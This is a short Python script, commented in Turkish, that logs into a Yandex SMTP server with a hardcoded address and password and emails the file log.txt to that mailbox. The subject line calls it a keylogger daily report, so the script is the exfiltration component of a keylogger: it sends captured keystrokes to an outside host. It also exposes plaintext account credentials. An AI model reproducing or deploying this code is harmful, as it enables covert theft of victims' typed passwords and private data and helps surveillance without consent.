import smtplib
from email.message import EmailMessage

mail = smtplib.SMTP("smtp.yandex.ru",587)
mail.ehlo()
mail.starttls()
mail.login("greenrock2516@yandex.com","1265913226")

message = EmailMessage()
message['From'] = 'Py11 <greenrock2516@yandex.com>'
message['To'] = 'Alıcı <greenrock2516@yandex.com>'
message['Subject'] = 'Keyyloger günlük rapor'

# Dosyayı ekleyin
with open('log.txt', 'rb') as f:
    file_data = f.read()
    file_name = f.name

message.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

mail.send_message(message)

mail.quit()

print("mesaj gönderildi")
